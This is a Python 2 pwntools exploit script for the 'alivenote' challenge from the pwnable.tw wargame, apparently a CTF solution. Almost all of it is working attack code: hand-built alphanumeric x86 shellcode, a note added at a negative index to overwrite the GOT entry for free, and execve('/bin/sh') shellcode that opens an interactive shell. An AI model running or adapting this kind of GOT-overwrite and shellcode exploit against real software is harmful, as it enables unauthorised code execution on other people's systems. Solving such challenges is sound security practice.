#!/bin/env python2
from pwn import *

#p = remote('ctf.pwnable.tw', 55688)
#p = gdb.debug('./alivenote', 'break del_note')
p = process('./alivenote')

def recv_menu():
    print p.recvuntil('Your choice :')

def add_note(index, name):
    recv_menu()
    p.sendline('1')
    print '1'
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print str(index)
    print p.recvuntil('Name :')
    if len(name) == 80:
        p.send(name)
    else:
        p.sendline(name)
    print name

def show_note(index):
    recv_menu()
    p.sendline('2')
    print '2'
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print str(index)

def del_note(index):
    recv_menu()
    p.sendline('3')
    print '3'
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print str(index)

got_free = 0x0804a014
bss_note = 0x0804a060
#shell32 = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
shell32 = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80'

#leak heap address
assembly =  'pop eax;' 
assembly += 'pop eax;'
#try to add 80 if the 7th lsb is off, otherwise fuck you
assembly += 'xor eax, 0x55555550;' 
assembly += 'xor eax, 0x55555530;' 
#change esp
assembly += 'push eax;' 
assembly += 'pop esp;' 
#set edx to a big num
assembly += 'push eax;' 
assembly += 'pop edx;' 
#zero out eax
assembly += 'and eax, 0x454e4f4a;' 
assembly += 'and eax, 0x3a313035;' 
#set ebx to 0, store one in edi
assembly += 'push eax;' 
assembly += 'pop ebx;' 
assembly += 'push eax;' 
assembly += 'pop edi;' 
#add eax to 3 and store in ebp
assembly += 'inc eax;' 
assembly += 'inc eax;' 
assembly += 'inc eax;'
assembly += 'push eax;' 
assembly += 'pop ebp;' 

#add 64 to eax and set to edx
#assembly += 'sub eax, 0x55555540;' 
#assembly += 'sub eax, 0x55555540;' 
#assembly += 'sub eax, 0x55555540;' 
#assembly += 'push eax;' 
#assembly += 'pop edx;' 

#set ecx to esp
assembly += 'push esp;' 
assembly += 'pop ecx;'
assembly += 'dec ecx;'
assembly += 'dec ecx;'
assembly += 'dec ecx;'
assembly += 'dec ecx;'
#zero out eax
assembly += 'push edi;' 
assembly += 'pop eax;' 
#set eax to 'nop; nop; int 0x80', store in edi
assembly += 'sub eax, 0x6f6f7e33;'
assembly += 'xor eax, 0x6f6f7033;'
assembly += 'xor eax, 0x6f6f7133;'
assembly += 'push eax;'
assembly += 'pop edi;'
#set eax to 'nop; nop; nop; nop;' store in esi
#assembly += 'xor eax, 0x55554060;'
assembly += 'inc eax;'
assembly += 'xor eax, 0x5555503c;'
assembly += 'push eax;'
assembly += 'pop esi;'
#set eax to 3
assembly += 'push ebp;' 
assembly += 'pop eax;' 
#push edi to stack
assembly += 'push edi;'
#push nop sled
#assembly += 'push esi;'
#assembly += 'push esi;'

payload = asm(assembly)
print payload, len(payload)

add_note((got_free-bss_note)/4, payload)
add_note(1, 'a'*64)
del_note(-19)
print shell32
p.sendline(shell32)

p.interactive()
